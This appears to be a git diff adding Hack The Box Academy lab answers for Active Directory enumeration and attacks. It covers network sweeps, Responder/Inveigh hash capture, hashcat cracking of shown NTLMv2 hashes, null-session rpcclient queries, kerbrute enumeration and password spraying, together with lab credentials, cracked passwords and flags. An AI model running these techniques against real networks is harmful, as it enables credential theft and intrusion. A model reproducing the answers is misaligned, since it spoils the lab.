@@ -3204,6 +3204,236 @@ Results: 3nd-0xf-Th3-R@inbow!
 
 ## [Active Directory Enumeration & Attacks](https://academy.hackthebox.com/module/details/143)
 
+### Initial Enumeration
+
+**While looking at inlanefreights public records; A flag can be seen. Find the flag and submit it. ( format == HTB{****} )**
+
+```
+# Method 1
+# Go to https://viewdns.info/
+# Do a DNS Look up record for inlanefreight.com
+
+# Method 2
+dig TXT inlanefreight.com 
+```
+
+Results: HTB{5Fz6UPNUFFzqjdg0AzXyxCjMZ}
+
+
+**SSH to  with user "htb-student" and password "HTB_@cademy_stdnt!"**
+**From your scans, what is the "commonName" of host 172.16.5.5 ?**
+
+```
+ssh htb-student@$ip
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+
+# On discovered host 172.16.5.5, run a nmap aggressive
+nmap -A 172.16.5.5
+```
+
+Results: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+
+
+**What host is running "Microsoft SQL Server 2019 15.00.2000.00"? (IP address, not Resolved name)**
+
+```
+# FRom previous sweep ping we also had this ip 172.16.5.130. We run a nmap to verify
+nmap -A 172.16.5.130
+```
+
+Results: 172.16.5.130
+
+
+### Sniffing out a Foothold
+
+**Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.**
+
+```
+# One thing you can do is running kerbrute. For that previously in your kali machine
+sudo responder -I ens224 -A -wf
+```
+
+Results: backupagent
+
+
+**Crack the hash for the previous account and submit the cleartext password as your answer.**
+
+```
+echo "backupagent::INLANEFREIGHT:a44a64f117fef681:A2DD31752724815828DDEEA3CE0D14AF:0101000000000000007B3554C738DB0115079F6A10E61FB00000000002000800360047003900360001001E00570049004E002D0043005300500057005600580058004B0037003000360004003400570049004E002D0043005300500057005600580058004B003700300036002E0036004700390036002E004C004F00430041004C000300140036004700390036002E004C004F00430041004C000500140036004700390036002E004C004F00430041004C0007000800007B3554C738DB0106000400020000000800300030000000000000000000000000300000EDC155D127A35F887E8796110B67D2FFC726BEB6F6A090039BB1FB587FB8CC4E0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > hash2
+hashcat -m 5600 hash2 /usr/share/wordlists/rockyou.txt
+```
+
+Results: h1backup55
+
+**Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.**
+
+```
+sudo responder -I ens224 -A -wf
+echo "wley::INLANEFREIGHT:59927891910ba43b:D0177CE077EDE96746E10975D2F34CAE:0101000000000000007B3554C738DB018AC0B8E5A51B55310000000002000800360047003900360001001E00570049004E002D0043005300500057005600580058004B0037003000360004003400570049004E002D0043005300500057005600580058004B003700300036002E0036004700390036002E004C004F00430041004C000300140036004700390036002E004C004F00430041004C000500140036004700390036002E004C004F00430041004C0007000800007B3554C738DB0106000400020000000800300030000000000000000000000000300000EDC155D127A35F887E8796110B67D2FFC726BEB6F6A090039BB1FB587FB8CC4E0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > hash3
+hashcat -m 5600 hash3 /usr/share/wordlists/rockyou.txt
+```
+
+Results: transporter@4
+
+
+**RDP to $ip (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!" Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer.**
+
+```
+xfreerdp /v:$IP /u:htb-student /p:"Academy_student_AD\!" /cert:ignore
+
+# Open Powershell as Administrator
+cd c:/tools
+.\Inveigh.exe   
+echo "svc_qualys::INLANEFREIGHT:c64015117cfae8cf:6E069821C26309BFF0ADA96F643AA703:0101000000000000007B3554C738DB0164C7AEAE827BFB2C0000000002000800360047003900360001001E00570049004E002D0043005300500057005600580058004B0037003000360004003400570049004E002D0043005300500057005600580058004B003700300036002E0036004700390036002E004C004F00430041004C000300140036004700390036002E004C004F00430041004C000500140036004700390036002E004C004F00430041004C0007000800007B3554C738DB0106000400020000000800300030000000000000000000000000300000EDC155D127A35F887E8796110B67D2FFC726BEB6F6A090039BB1FB587FB8CC4E0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > hashsvc
+hashcat -m 5600 hashsvc /usr/share/wordlists/rockyou.txt
+```
+
+Results: security#1
+
+
+### Sighting In, Hunting For A User
+
+**SSH to  $ip with user "htb-student" and password "HTB_@cademy_stdnt!"**
+**What is the default Minimum password length when a new domain is created? (One number)**
+
+```
+# This information is included in the sylabus. It does not require us to run any command.
+```
+
+Results: 7
+
+
+**What is the minPwdLength set to in the INLANEFREIGHT.LOCAL domain? (One number)**
+
+```
+# Connect to the pivot machine
+ssh htb-student@$ip
+
+ip a
+
+# Sweep ping to discover IPs in the new the network range 172.16.5.X
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+
+# rpcclient via the SMB NULL session technique:
+rpcclient -U "" -N 172.16.5.5
+
+# Now, within rpcclient terminal, enumerate domain password information
+getdompwinfo
+```
+
+Results: 8
+
+
+**Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?**
+
+```
+sudo git clone https://github.com/ropnop/kerbrute.git
+
+# Typing make help will show us the compiling options available.
+cd kerbrute
+make help
+
+# type make all and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).
+sudo make all
+
+# The newly created dist directory will contain our compiled binaries.
+ls -la dist
+
+cd dist
+python3 -m http.server 8001
+
+# Connec to the pivot host
+ssh htb-student@$ip
+wget http://$ipAttacker:8001 kerbrute_linux_amd64 
+
+# Also download the jsmith.txt from https://github.com/insidetrust/statistically-likely-usernames/tree/master 
+
+# Run kerbrute from the pivot host
+kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
+
+```
+
+Results: 56 
+
+
+### Spray Responsibly
+
+**Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.**
+
+```
+./kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
+
+./kerbrute_linux_386 passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1
+```
+
+Results: sgage
+
+**RDP to $ip (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!". Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.**
+
+```
+# Open powershell as Admin
+Import-Module .\DomainPasswordSpray.ps1 
+
+Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue 
+
+```
+
+Results: dbranch
+
+
+
+### Deeper Down the Rabbit Hole
+
+
+Question
+
+```
+
+```
+
+Results:
+
+
+Question
+
+```
+
+```
+
+Results:
+
+
+Question
+
+```
+
+```
+
+Results:
+
+
+Question
+
+```
+
+```
+
+Results:
+
+
+
+Question
+
+```
+
+```
+
+Results:
+
+
+
+
+
 ## [Using Web Proxies](https://academy.hackthebox.com/module/details/110)
 
 ### Intercepting Web Requests
